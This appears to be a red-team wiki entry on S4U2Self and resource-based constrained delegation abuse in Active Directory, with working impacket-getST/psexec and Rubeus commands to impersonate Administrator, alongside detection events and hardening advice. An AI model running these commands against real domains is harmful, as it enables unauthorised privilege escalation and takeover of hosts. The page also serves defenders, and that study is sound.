---
title: S4U2Self Abuse
slug: s4u2self-abuse
---

> **TL;DR:** When you control a computer account that is the target of constrained or resource-based delegation, use S4U2Self to mint a forwardable TGS for *any* user — including Domain Admins — and walk in as them.

## What it is
S4U2Self ("Service for User to Self") is the Kerberos extension that lets a service request a TGS to itself on behalf of an arbitrary principal, without that user authenticating. Combined with S4U2Proxy and a delegation primitive — classic constrained delegation, or **resource-based constrained delegation (RBCD)** writable via `msDS-AllowedToActOnBehalfOfOtherIdentity` — it produces a usable service ticket as `Administrator@DOMAIN` to a target service on the delegating host. The ticket is forwardable by default (or coercible via the `tgtdeleg` trick), giving full impersonation.

## Preconditions / where it applies
- Control of a computer/service account (machine hash, AES key, or TGT)
- That account is either trusted for constrained delegation to the target SPN, **or** is listed in the target's `msDS-AllowedToActOnBehalfOfOtherIdentity`
- Victim user is not marked "Account is sensitive and cannot be delegated" / not in Protected Users

## Technique
The two-leg flow: S4U2Self gets a TGS to *self* as the impersonated user; S4U2Proxy then exchanges that for a TGS to the real target SPN. With RBCD this is the final step of the "GenericWrite on a computer → SYSTEM on it" chain.

```bash
# Impmpacket RBCD path (Linux)
impacket-getST -spn cifs/victim.corp.local \
  -impersonate Administrator \
  -dc-ip 10.0.0.10 corp.local/fake01\$:'Passw0rd!'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass victim.corp.local
```

```powershell
# Rubeus (Windows) — note: short hostname in SPN often required
Rubeus.exe s4u /user:FAKE01$ /rc4:<NTLM> /impersonateuser:Administrator `
  /msdsspn:cifs/victim /altservice:cifs,host,http /ptt
```

OPSEC: the S4U2Self leg generates 4769 with ticket options 0x40810010 and **Account Name == Service Name** — a high-signal pattern. RBCD writes touch `msDS-AllowedToActOnBehalfOfOtherIdentity` (5136 with attribute LDAPDisplayName=msDS-AllowedToActOnBehalfOfOtherIdentity).

## Related: [[resource-based-constrained-delegation]], [[kerberos]], [[unconstrained-delegation]]

## Detection and defence
- 4769 where ServiceName equals AccountName and TicketOptions = 0x40810010 (self-ticket pattern)
- 5136 modifications to `msDS-AllowedToActOnBehalfOfOtherIdentity` outside change windows
- Add privileged users to **Protected Users** and set "Account is sensitive and cannot be delegated"
- Audit and minimise `SeMachineAccountPrivilege` (MachineAccountQuota = 0) to block fake-computer creation

## References
- [ired.team — RBCD computer takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) — original walkthrough
- [Elad Shamir — Wagging the Dog](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html) — foundational S4U2Self/RBCD research
